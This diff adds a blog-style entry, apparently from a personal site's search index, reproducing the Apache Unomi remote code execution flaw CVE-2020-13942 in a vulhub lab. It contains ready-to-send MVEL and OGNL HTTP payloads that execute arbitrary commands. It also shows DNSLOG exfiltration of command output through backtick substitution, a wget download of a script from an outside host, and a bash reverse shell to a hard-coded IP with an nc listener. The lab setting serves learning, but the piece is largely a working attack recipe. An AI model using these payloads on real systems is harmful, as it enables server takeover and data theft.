@@ -257,4 +257,107 @@
 <p><img src="/images/xue_xi_tong_1/Untitled%207.png" alt="/images/xue_xi_tong_1/Untitled%207.png"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Apache Unomi远程代码执行漏洞（CVE-2020-13942）复现</title>
+    <url>/2021/03/20/Apache-Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-13942%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub+docker快速搭建</p>
+<p><img src="/images/cve-2020-13942/Untitled.png" alt="/images/cve-2020-13942/Untitled.png"></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Apache Unomi是一个Java开源客户数据平台，这是一个Java服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi可用于在非常不同的系统（例如CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。</p>
+<p>在Apache Unomi 1.5.1版本之前，攻击者可以通过构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。</p>
+<p><strong>不过没有命令执行的回显</strong> </p>
+<p><strong>这边可以尝试使用DNSLOG的方式获得回显</strong></p>
+<p>原理：</p>
+<p>域名分级</p>
+<p>主机名.三级域名.二级域名.顶级域名</p>
+<p><img src="/images/cve-2020-13942/Untitled%201.png" alt="/images/cve-2020-13942/Untitled%201.png"></p>
+<p>DNS递归查询过程</p>
+<p>查找<a href="http://www.example.com的IP地址的连锁反应：">www.example.com的IP地址的连锁反应：</a></p>
+<p>用户计算机首先会查询该网站所使用的域名服务器（DNS服务器）。 这个过程就是图片中的“递归式域名服务器”。</p>
+<p>DNS服务器不知道<a href="http://www.example.com的ip地址,因此dns服务器会开始进行连锁查询,直到查找到ip地址并向计算机报告./">www.example.com的IP地址，因此DNS服务器会开始进行连锁查询，直到查找到IP地址并向计算机报告。</a></p>
+<p>1.在互联网根服务器中进行查找，获取顶级域名.com的DNS服务器。</p>
+<p>2.在.com的顶级域名DNS服务器进行查找，获取example.com的授权DNS服务器。</p>
+<p>3.在exapmle.com的授权DNS服务器中查找主机<a href="http://www.example.com的ip地址,最后将ip地址返回计算机/">www.example.com的IP地址，最后将IP地址返回计算机</a></p>
+<p>4.大功告成！ 现在计算机获得了<a href="http://www.example.com的ip地址,用户可以访问该网站了./">www.example.com的IP地址，用户可以访问该网站了。</a></p>
+<p>DNSLOG 生成的网址</p>
+<p>随机字符.dnslog.cn</p>
+<p><img src="/images/cve-2020-13942/Untitled%202.png" alt="/images/cve-2020-13942/Untitled%202.png"></p>
+<p>当主机ping这个地址时（即对这个地址进行了fang） 这边就会产生记录</p>
+<p><img src="/images/cve-2020-13942/Untitled%203.png" alt="/images/cve-2020-13942/Untitled%203.png"></p>
+<p>反引号</p>
+<p>Linux执行命令时会先将反引号中的内容当命令执行 回显的结果来替换反引号及其内容</p>
+<p>所以若过让服务器ping <code>命令</code>.随机字符.dnslog.cn 那么DNSlog上就会记录下命令执行的结果</p>
+<p>这种方式可以用在 SQL盲注 命令执行（无回显）等情况</p>
+<h2 id="不反弹shell获取回显"><a href="#不反弹shell获取回显" class="headerlink" title="不反弹shell获取回显"></a>不反弹shell获取回显</h2><p>此处配合LINUX 的反引号 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">``</span><br><span class="line">e.g ping `whoami`<span class="number">.0</span>bufat.dnslog.cn</span><br><span class="line">在执行Ping 命令之前  会先执行反引号中的命令然后代入结果执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试构造POC为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;ping `whoami`.0bufat.dnslog.cn\&quot;)  (省略)</span></span><br></pre></td></tr></table></figure>
+
+<p>此时DNSlog处没有记录 很可能表示命令没有执行 也有可能是反引号被屏蔽</p>
+<p>尝试创建一个用反引号执行命令后命名的文件</p>
+<p>构造POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;touch /tmp/`whoami`\&quot;) </span></span><br></pre></td></tr></table></figure>
+
+<p>服务器上查看生成了这样的 可见可能是对反引号做了屏蔽</p>
+<p><img src="/images/cve-2020-13942/Untitled%204.png" alt="/images/cve-2020-13942/Untitled%204.png"></p>
+<p>换个思路 </p>
+<p>通过wget上传已经写好的sh文件 然后命令执行 sh文件 </p>
+<p>写好sh文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ping `whoami`.h0mvvx.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>上传至服务器下载</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;wget http://www.iframe.xyz/2.sh\&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(\<span class="string">&quot;sh 2.sh\&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>查看DNSLOG的记录</p>
+<p><img src="/images/cve-2020-13942/Untitled%205.png" alt="/images/cve-2020-13942/Untitled%205.png"></p>
+<p>命令成功被执行 同时反引号的内容被执行 whoami被执行返回root</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>攻击端服务器设置一个监听端口</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/cve-2020-13942/Untitled%206.png" alt="/images/cve-2020-13942/Untitled%206.png"></p>
+<p>尝试执行bash命令弹shell 但是400报错</p>
+<p>网上复现时是可以直接反弹的这边不知道为什么</p>
+<p><img src="/images/cve-2020-13942/Untitled%207.png" alt="/images/cve-2020-13942/Untitled%207.png"></p>
+<p>调整思路下载sh文件执行</p>
+<p><img src="/images/cve-2020-13942/Untitled%208.png" alt="/images/cve-2020-13942/Untitled%208.png"></p>
+<p><img src="/images/cve-2020-13942/Untitled%209.png" alt="/images/cve-2020-13942/Untitled%209.png"></p>
+<p> 但是此次执行监听端并没收到回弹的shell</p>
+<p>服务器运行查询原因</p>
+<p>服务端直接执行命令可以成功</p>
+<p>但是执行sh文件 会报错</p>
+<p>  <strong>sh: 1: Syntax error: Bad fd number</strong></p>
+<p><img src="/images/cve-2020-13942/Untitled%2010.png" alt="/images/cve-2020-13942/Untitled%2010.png"></p>
+<p>这边主要原因是 sh sh文件  默认是以dash执行的（linux shell的一种类型）</p>
+<hr>
+<p><a href="https://blog.csdn.net/weixin_39212776/article/details/81079727">https://blog.csdn.net/weixin_39212776/article/details/81079727</a></p>
+<p><strong>补充：LINUX shell</strong></p>
+<pre><code>**linux中程序解释命令后通过内核与计算机硬件交流。  而使用者则是通过shell与系统内核进行交流**
+</code></pre>
+<p><strong>shell是一个处理用户请求的接口 负责解释输入命令调用用户希望使用的程序</strong></p>
+<pre><code>**Shell Script** 
+</code></pre>
+<p><strong>是针对shell写的脚本 （.sh）批量处理命令</strong></p>
+<p><strong>Bash 和 Dash</strong> </p>
+<p> <strong>两者都是shell的不同类型 遵从不同的规则</strong></p>
+<p><strong>而反弹shell的命令要以bash执行</strong></p>
+<p><strong>sh 使用的是dash执行</strong></p>
+<p><strong>bash 使用bash执行</strong></p>
+<hr>
+<p>解决方案</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>将运行命令改为bash</span><br><span class="line">bash she11.sh</span><br><span class="line">(命令为sh就算加了注释也会以sh执行)</span><br><span class="line"><span class="number">2.</span>在sh文件中第一行加入注释</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">119.3</span><span class="number">.173</span><span class="number">.27</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">然后运行方式改为 ./she11.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这边执行命令</p>
+<p><img src="/images/cve-2020-13942/Untitled%2011.png" alt="/images/cve-2020-13942/Untitled%2011.png"></p>
+<p>攻击端成功收到返回的shell</p>
+<p><img src="/images/cve-2020-13942/Untitled%2012.png" alt="/images/cve-2020-13942/Untitled%2012.png"></p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><hr>
+<p>POC1（MVEL）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: IP:<span class="number">8181</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 493</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;filters&quot;: [</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            &quot;id&quot;: &quot;sample&quot;,</span></span><br><span class="line"><span class="comment">            &quot;filters&quot;: [</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                    &quot;condition&quot;: &#123;</span></span><br><span class="line"><span class="comment">                         &quot;parameterValues&quot;: &#123;</span></span><br><span class="line"><span class="comment">                            &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;要执行的命令\&quot;);&quot;</span></span><br><span class="line"><span class="comment">                        &#125;,</span></span><br><span class="line"><span class="comment">                        &quot;type&quot;: &quot;profilePropertyCondition&quot;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            ]</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">    &quot;sessionId&quot;: &quot;sample&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC2（ONGI）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: IP:<span class="number">8181</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 1066</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;personalizations&quot;:[</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      &quot;id&quot;:&quot;gender-test&quot;,</span></span><br><span class="line"><span class="comment">      &quot;strategy&quot;:&quot;matching-first&quot;,</span></span><br><span class="line"><span class="comment">      &quot;strategyOptions&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;fallback&quot;:&quot;var2&quot;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      &quot;contents&quot;:[</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          &quot;filters&quot;:[</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              &quot;condition&quot;:&#123;</span></span><br><span class="line"><span class="comment">                &quot;parameterValues&quot;:&#123;</span></span><br><span class="line"><span class="comment">                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)).(#getruntimemethod = #runtimeclass.getDeclaredMethods().&#123;^ #this.name.equals(\&quot;getRuntime\&quot;)&#125;[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().&#123;? #this.name.equals(\&quot;exec\&quot;)&#125;.&#123;? #this.getParameters()[0].getType().getName().equals(\&quot;java.lang.String\&quot;)&#125;.&#123;? #this.getParameters().length &lt; 2&#125;[0]).(#execmethod.invoke(#rtobj,\&quot;要执行的命令\&quot;))&quot;,</span></span><br><span class="line"><span class="comment">                  &quot;comparisonOperator&quot;:&quot;equals&quot;,</span></span><br><span class="line"><span class="comment">                  &quot;propertyValue&quot;:&quot;male&quot;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &quot;type&quot;:&quot;profilePropertyCondition&quot;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          ]</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      ]</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  ],</span></span><br><span class="line"><span class="comment">  &quot;sessionId&quot;:&quot;sample&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
 </search>
